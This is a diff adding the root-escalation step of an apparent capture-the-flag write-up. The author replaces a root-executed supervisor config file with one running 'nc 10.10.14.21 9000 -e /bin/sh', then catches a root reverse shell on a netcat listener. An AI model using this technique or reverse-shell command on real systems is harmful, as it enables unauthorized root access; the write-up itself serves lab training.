@@ -266,3 +266,45 @@ Make the file executable and then run it. After some time has passed you should 
 ```
 2019/09/18 19:06:02 CMD: UID=0    PID=5962   | sudo -u nobody /usr/bin/node /home/professor/memcached.js
 ```
+So this process contains the same <b>memcached.js</b> file that is in the professors home directory
+```
+# ls -la
+total 4392
+drwxr-sr-x    4 professo professo      4096 Sep 18 19:04 .
+drwxr-xr-x    7 root     root          4096 Feb 16  2019 ..
+lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
+drwx------    2 professo professo      4096 Jan 31  2019 .ssh
+-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini
+-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js
+drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules
+```
+We cant read the <b>memcached.js</b> but we can read the <b>memcached.ini</b> file.
+```
+cat memcached.ini
+[program:memcached]
+command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
+```
+This file has the same command that is being executed in the process. This tells me that the cron job is executing anything in this file as root. My first thought was we need to edit the <b>memcached.ini</b> file to put in a reverse shell to give me root but I saw that we don't have write permissions. After a sometime had passed, I had realized I needed to go back to the basics. Even though the file is owned by root, we can still delete the file because it is in our home directory. All we need to do is replace it with a file of our own with the same name to give us a root shell
+```
+# rm memcached.ini
+rm: remove 'memcached.ini'? y
+```
+Make sure the new file contains something like this
+```
+[program:memcached]
+command = nc 10.10.14.21 9000 -e /bin/sh
+```
+Now set up a <b>nc</b> listener and wait for the shell to spawn
+```
+# nc -lvnp 9000
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::9000
+Ncat: Listening on 0.0.0.0:9000
+Ncat: Connection from 10.10.10.131.
+Ncat: Connection from 10.10.10.131:33131.
+
+whoami
+root
+```
+So now you can grab the root flag
+<br><br><br>
